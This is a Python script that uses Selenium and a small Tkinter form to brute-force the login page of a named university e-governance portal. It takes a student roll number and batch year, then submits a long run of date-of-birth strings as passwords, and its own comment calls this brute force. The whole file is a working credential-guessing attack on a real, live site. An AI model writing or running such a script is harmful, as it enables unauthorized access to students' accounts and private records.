from selenium import webdriver
from selenium.webdriver.common.keys import Keys


import time



    
browser = webdriver.Firefox()
browser.get('http://egov.uok.edu.in/eConduct/')
def signIn(email,password):
        
        search1=browser.find_element_by_xpath('/html/body/form/div[3]/section[1]/div/table/tbody/tr[1]/td[2]/input')
        search2=browser.find_element_by_xpath('/html/body/form/div[3]/section[1]/div/table/tbody/tr[2]/td[2]/input')  
        button=browser.find_element_by_xpath('/html/body/form/div[3]/section[1]/div/table/tbody/tr[3]/td[2]/input')
        
        #search2=driver.find_element_by_xpath
        #emailInput = self.browser.find_elements_by_css_selector('form input')[0]
        #passwordInput = self.browser.find_elements_by_css_selector('form input')[1]


        #emailInput.send_keys(self.email)
        search1.send_keys(email)
        search2.send_keys(password)
       # time.sleep(3)
        button.send_keys(Keys.ENTER)
        #errormessage=self.browser.find_element_by_xpath('/html/body/form/div[3]/section[2]/div[1]')
        
        #print("error ",errormessage)
       #i am genrating delay because on 2g network it takes time for browser
	#so added 6 sec before calling signIn() again
        #time.sleep(1)



def logic_start(get_enrol,year):
    day=11
    month=4
    year=str(int(year)-20)
    
    i=0
    print("bact = ",year,"enrol ",get_enrol)
    while True:
        roll=int(get_enrol)
        
        #here i am checking sequences of dob incrementing year,month,day
        #it acts as brute force
        #i 
        if month<10 and day<10 :
            get_str='0'+str(day)+'0'+str(month)+str(year)
        elif month>=10 and day<10:
            get_str='0'+str(day)+str(month)+str(year)
        elif month<10 and day>=10:
            get_str=str(day)+'0'+str(month)+str(year)
        else:
            get_str=str(day)+str(month)+str(year)
        if i==0:
            print("get str",get_str)
            signIn(roll,get_str)
            i+=1
        else:
            signIn('',get_str)
            print("get str",get_str)
        
        
        
        
            
        if month!=12 and day==31:
            month=month+1
            day=1
        elif month==12 and day==31:
            year=int(year)+1
            day=1
            month=1
        
        day=day+1
                






from tkinter import *

def show_entry_fields():
    
    print(int(e1.get()),e2.get())#int(e2.get())-20)
    logic_start(int(e1.get()),e2.get())
def quit():
    exit()
master = Tk()



master.title("Welcome to the project")
master.geometry("300x300")
master.configure(background="purple")

#label.pack(side=TOP)

Label(master, 
         text="Roll Number").grid(row=2,column=3)
Label(master, 
         text="Batch").grid(row=3,column=3)

e1 = Entry(master)
e2 = Entry(master)

e1.grid(row=2, column=4)
e2.grid(row=3, column=4)

Button(master, 
          text='Quit', fg="black",background="red",
          command=master.quit).grid(row=4, 
                                    column=2, 
                                    sticky=W, 
                                    pady=4)
Button(master, 
          text='submit',fg="black", background="red",command=show_entry_fields).grid(row=4, 
                                                       column=3, 
                                                       sticky=W, 
                                                       pady=4)

mainloop()
